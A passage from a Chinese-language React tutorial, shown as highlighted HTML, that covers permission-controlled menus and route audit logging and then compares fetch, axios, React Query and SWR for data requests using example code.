class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(<br>        allItems.<span class="hljs-title function_">map</span>(<span class="hljs-keyword">async</span> item =&gt; &#123;<br>          <span class="hljs-keyword">if</span> (!item.<span class="hljs-property">permission</span>) <span class="hljs-keyword">return</span> item;<br>          <br>          <span class="hljs-keyword">const</span> hasPerm = <span class="hljs-keyword">await</span> permissionService.<span class="hljs-title function_">checkPermission</span>(<br>            item.<span class="hljs-property">permission</span><br>          );<br>          <span class="hljs-keyword">return</span> hasPerm ? item : <span class="hljs-literal">null</span>;<br>        &#125;)<br>      );<br>      <br>      <span class="hljs-title function_">setMenuItems</span>(authorizedItems.<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>));<br>    &#125;;<br>    <br>    <span class="hljs-title function_">loadMenu</span>();<br>  &#125;, [user]);<br>  <br>  <span class="hljs-keyword">return</span> menuItems;<br>&#125;;<br><br><span class="hljs-comment">// 菜单组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">AppSidebar</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> menuItems = <span class="hljs-title function_">useAuthorizedMenu</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">        &#123;menuItems.map(item =&gt; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;item.path&#125;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&#123;item.path&#125;</span>&gt;</span>&#123;item.title&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">        ))&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="安全增强措施"><a href="#安全增强措施" class="headerlink" title="安全增强措施"></a>安全增强措施</h3><p><strong>敏感数据保护</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用权限hook封装数据请求</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">useProtectedData</span> = (<span class="hljs-params">endpoint, requiredPermission</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> hasPermission = <span class="hljs-title function_">usePermission</span>(requiredPermission);<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (hasPermission) &#123;<br>      <span class="hljs-title function_">fetch</span>(endpoint)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())<br>        .<span class="hljs-title function_">then</span>(setData);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-title function_">setData</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// 清除已有数据</span><br>    &#125;<br>  &#125;, [hasPermission, endpoint]);<br>  <br>  <span class="hljs-keyword">return</span> hasPermission ? data : <span class="hljs-literal">null</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>路由权限审计日志</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 在路由守卫中添加日志</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">RouteGuard</span> = (<span class="hljs-params">&#123; children, roles &#125;</span>) =&gt; &#123;<br>  <span class="hljs-comment">// ...权限检查逻辑</span><br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (isAuthenticated) &#123;<br>      auditService.<span class="hljs-title function_">logRouteAccess</span>(<br>        location.<span class="hljs-property">pathname</span>, <br>        user.<span class="hljs-property">id</span>,<br>        hasPermission ? <span class="hljs-string">&#x27;GRANTED&#x27;</span> : <span class="hljs-string">&#x27;DENIED&#x27;</span><br>      );<br>    &#125;<br>  &#125;, [location]);<br>  <br>  <span class="hljs-comment">// ...</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>权限变更强制刷新</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 监听权限变更</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePermissionChange</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-comment">// 显示刷新提示</span><br>    <span class="hljs-title function_">setShowRefresh</span>(<span class="hljs-literal">true</span>);<br>  &#125;;<br>  <br>  permissionService.<span class="hljs-title function_">onChange</span>(handlePermissionChange);<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> permissionService.<span class="hljs-title function_">offChange</span>(handlePermissionChange);<br>&#125;, []);<br><br><span class="hljs-comment">// 在UI中显示提示</span><br>&#123;showRefresh &amp;&amp; (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;refresh-banner&quot;</span>&gt;</span></span><br><span class="language-xml">    您的权限已更新，请</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> window.location.reload()&#125;&gt;</span><br><span class="language-xml">      刷新页面</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    以应用更改</span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>)&#125;<br></code></pre></td></tr></table></figure><h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><ul><li>核心模式：<ul><li>高阶组件(HOC)模式：适合类组件场景</li><li>包装器组件：函数组件推荐方案</li><li>路由元数据：React Router 6.4+最佳实践</li></ul></li><li>权限模型：<ul><li>RBAC：基于角色的权限控制（适合大多数场景）</li><li>ABAC：基于属性的动态权限控制（复杂系统适用）</li></ul></li><li>企业级方案：<ul><li>JWT认证集成</li><li>权限变更实时响应</li><li>动态菜单控制</li><li>审计日志追踪</li></ul></li><li>面试重点：<ul><li>路由级 vs 组件级权限控制</li><li>权限变更后的状态同步</li><li>按钮级权限的性能优化</li><li>动态菜单的实现方案</li></ul></li></ul><h2 id="6-4-数据请求方案（fetch、axios、React-Query、SWR）"><a href="#6-4-数据请求方案（fetch、axios、React-Query、SWR）" class="headerlink" title="6.4 数据请求方案（fetch、axios、React Query、SWR）"></a>6.4 数据请求方案（fetch、axios、React Query、SWR）</h2><h3 id="数据请求核心方案对比"><a href="#数据请求核心方案对比" class="headerlink" title="数据请求核心方案对比"></a>数据请求核心方案对比</h3><table><thead><tr><th align="left">方案</th><th align="left">特点</th><th align="left">适用场景</th><th align="left">包大小</th></tr></thead><tbody><tr><td align="left">原生 fetch</td><td align="left">浏览器原生 API，无需安装</td><td align="left">简单请求、现代浏览器项目0kB</td><td align="left"></td></tr><tr><td align="left">Axios</td><td align="left">功能丰富、拦截器、自动转换 JSON</td><td align="left">企业级应用、复杂请求处理4.8kB</td><td align="left"></td></tr><tr><td align="left">React Query</td><td align="left">数据缓存、自动重试、请求管理</td><td align="left">复杂数据交互、实时应用11.8kB</td><td align="left"></td></tr><tr><td align="left">SWR</td><td align="left">轻量级、快速集成、智能缓存</td><td align="left">快速开发、中小型项目3.5kB</td><td align="left"></td></tr></tbody></table><h3 id="基础请求方案深度解析"><a href="#基础请求方案深度解析" class="headerlink" title="基础请求方案深度解析"></a>基础请求方案深度解析</h3><p><strong>Fetch API</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 基础 GET 请求</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP error! status: <span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-keyword">return</span> data;<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Fetch error:&#x27;</span>, error);<br>    <span class="hljs-keyword">throw</span> error;<br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// POST 请求示例</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">postData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">payload</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">headers</span>: &#123;<br>      <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>      <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">$&#123;token&#125;</span>`</span><br>    &#125;,<br>    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload)<br>  &#125;);<br>  <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();<br>&#125;;<br></code></pre></td></tr></table></figure><p>核心特性：</p><ul><li>优点：浏览器原生支持、Promise 接口</li><li>缺点：无请求取消、无超时控制（需手动实现）</li><li>关键配置：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 超时控制</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchWithTimeout</span> = (<span class="hljs-params">url, options = &#123;&#125;, timeout = <span class="hljs-number">8000</span></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">race</span>([<br>    <span class="hljs-title function_">fetch</span>(url, options),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">_, reject</span>) =&gt;</span> <br>      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Request timeout&#x27;</span>)), timeout)<br>    )<br>  ]);<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Axios 高级应用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span>;<br><br><span class="hljs-comment">// 创建实例</span><br><span class="hljs-keyword">const</span> api = axios.<span class="hljs-title function_">create</span>(&#123;<br>  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">&#x27;https://api.example.com&#x27;</span>,<br>  <span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span>,<br>  <span class="hljs-attr">headers</span>: &#123;<span class="hljs-string">&#x27;X-Custom-Header&#x27;</span>: <span class="hljs-string">&#x27;value&#x27;</span>&#125;<br>&#125;);<br><br><span class="hljs-comment">// 请求拦截器</span><br>api.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function"><span class="hljs-params">config</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (token) &#123;<br>    config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">$&#123;token&#125;</span>`</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> config;<br>&#125;, <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error));<br><br><span class="hljs-comment">// 响应拦截器</span><br>api.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(<br>  <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-property">data</span>,<br>  <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">response</span>?.<span class="hljs-property">status</span> === <span class="hljs-number">401</span>) &#123;<br>      <span class="hljs-comment">// 处理未授权</span><br>      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;/login&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);<br>  &#125;<br>);<br><br><span class="hljs-comment">// 取消令牌</span><br><span class="hljs-keyword">const</span> source = axios.<span class="hljs-property">CancelToken</span>.<span class="hljs-title function_">source</span>();<br>api.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/data&#x27;</span>, &#123; <span class="hljs-attr">cancelToken</span>: source.<span class="hljs-property">token</span> &#125;);<br>source.<span class="hljs-title function_">cancel</span>(<span class="hljs-string">&#x27;Operation canceled by user&#x27;</span>);<br></code></pre></td></tr></table></figure><p>核心特性：</p><ul><li>自动转换 JSON 数据</li><li>客户端 XSRF 防护</li><li>并发请求支持 (axios.all)</li><li>上传进度监控</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">api.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/upload&#x27;</span>, formData, &#123;<br>  <span class="hljs-attr">onUploadProgress</span>: <span class="hljs-function"><span class="hljs-params">progressEvent</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> percent = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(<br>      (progressEvent.<span class="hljs-property">loaded</span> * <span class="hljs-number">100</span>) / progressEvent.<span class="hljs-property">total</span><br>    );<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Upload progress: <span class="hljs-subst">$&#123;percent&#125;</span>%`</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="现代数据管理库深度解析"><a href="#现代数据管理库深度解析" class="headerlink" title="现代数据管理库深度解析"></a>现代数据管理库深度解析</h3><p><strong>React Query 核心概念</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; useQuery, useMutation, <span class="hljs-title class_">QueryClient</span>, <span class="hljs-title class_">QueryClientProvider</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-query&#x27;</span>;<br><br><span class="hljs-comment">// 创建查询客户端</span><br><span class="hljs-keyword">const</span> queryClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryClient</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">QueryClientProvider</span> <span class="hljs-attr">client</span>=<span class="hljs-string">&#123;queryClient&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">UserProfile</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">QueryClientProvider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 查询示例</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; data, isLoading, isError, error &#125; = <span class="hljs-title function_">useQuery</span>(<br>    <span class="hljs-string">&#x27;userData&#x27;</span>, <br>    <span class="hljs-function">() =&gt;</span> api.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/users/123&#x27;</span>),<br>    &#123;<br>      <span class="hljs-attr">staleTime</span>: <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>, <span class="hljs-comment">// 5分钟保鲜期</span><br>      <span class="hljs-attr">retry</span>: <span class="hljs-number">2</span>, <span class="hljs-comment">// 失败重试次数</span><br>      <span class="hljs-attr">refetchOnWindowFocus</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// 窗口聚焦时重新获取</span><br>    &#125;<br>  );<br><br>  <span class="hljs-comment">// 突变示例</span><br>  <span class="hljs-keyword">const</span> updateUser = <span class="hljs-title function_">useMutation</span>(<br>    <span class="hljs-function">(<span class="hljs-params">newData</span>) =&gt;</span> api.<span class="hljs-title function_">put</span>(<span class="hljs-string">&#x27;/users/123&#x27;</span>, newData),<br>    &#123;<br>      <span class="hljs-attr">onSuccess</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-comment">// 更新成功后重新获取用户数据</span><br>        queryClient.<span class="hljs-title function_">invalidateQueries</span>(<span class="hljs-string">&#x27;userData&#x27;</span>);<br>      &#125;,<br>      <span class="hljs-attr">onError</span>: <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>        toast.<span class="hljs-title function_">error</span>(<span class="hljs-string">`更新失败: <span class="hljs-subst">$&#123;error.message&#125;</span>`</span>);<br>      &#125;<br>    &#125;<br>  );<br><br>  <span class="hljs-keyword">if</span> (isLoading) <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Spinner</span> /&gt;</span></span>;<br>  <span class="hljs-keyword">if</span> (isError) <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Error</span> <span class="hljs-attr">message</span>=<span class="hljs-string">&#123;error.message&#125;</span> /&gt;</span></span>;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;data.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> updateUser.mutate(&#123; name: &#x27;新名字&#x27; &#125;)&#125;&gt;</span><br><span class="language-xml">        更新用户</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>核心特性：</p><ul><li>智能缓存：自动管理请求缓存</li><li>后台刷新：数据过期时在后台更新</li><li>分页查询：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> &#123; data, fetchNextPage &#125; = <span class="hljs-title function_">useInfiniteQuery</span>(<br>  <span class="hljs-string">&#x27;projects&#x27;</span>,<br>  <span class="hljs-function">(<span class="hljs-params">&#123; pageParam = <span class="hljs-number">1</span> &#125;</span>) =&gt;</span> api.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/projects?page=<span class="hljs-subst">$&#123;pageParam&#125;</span>`</span>),<br>  &#123;<br>    <span class="hljs-attr">getNextPageParam</span>: <span class="hljs-function">(<span class="hljs-params">lastPage</span>) =&gt;</span> lastPage.<span class="hljs-property">nextPage</span><br>  &#125;<br>);<br></code></pre></td></tr></table></figure><p><strong>SWR 核心应用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> useSWR <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;swr&#x27;</span>;<br><br><span class="hljs-comment">// 自定义 fetcher</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetcher</span> = (<span class="hljs-params">...args</span>) =&gt; <span class="hljs-title function_">fetch</span>(...args).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>());<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Profile</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; data, error, mutate &#125; = <span class="hljs-title function_">useSWR</span>(<br>    <span class="hljs-string">&#x27;/api/user/123&#x27;</span>, <br>    fetcher,<br>    &#123;<br>      <span class="hljs-attr">revalidateOnFocus</span>: <span class="hljs-literal">false</span>,<br>      <span class="hljs-attr">refreshInterval</span>: <span class="hljs-number">60000</span>, <span class="hljs-comment">// 60秒刷新一次</span><br>      <span class="hljs-attr">onErrorRetry</span>: <span class="hljs-function">(<span class="hljs-params">error, key, config, revalidate, &#123; retryCount &#125;</span>) =&gt;</span> &#123;<br>        <span class="hljs-comment">// 404错误不重试</span><br>        <span class="hljs-keyword">if</span> (error.<span class="hljs-property">status</span> === <span class="hljs-number">404</span>) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-comment">// 10秒后重试</span><br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">revalidate</span>(&#123; retryCount &#125;), <span class="hljs-number">10000</span>);<br>      &#125;<br>    &#125;<br>  );<br><br>  <span class="hljs-comment">// 乐观更新</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">updateName</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">newName</span>) =&gt; &#123;<br>    <span class="hljs-comment">// 立即更新本地数据</span><br>    <span class="hljs-title function_">mutate</span>(&#123; ...data, <span class="hljs-attr">name</span>: newName &#125;, <span class="hljs-literal">false</span>);<br>    <br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">patch</span>(<span class="hljs-string">&#x27;/api/user/123&#x27;</span>, &#123; <span class="hljs-attr">name</span>: newName &#125;);<br>      <span class="hljs-comment">// 重新验证确保数据最新</span><br>      <span class="hljs-title function_">mutate</span>();<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>      <span class="hljs-comment">// 出错时回滚</span><br>      <span class="hljs-title function_">mutate</span>(data, <span class="hljs-literal">false</span>);<br>    &#125;<br>  &#125;;<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;data ? <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;data.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span> : &#x27;Loading...&#x27;&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span 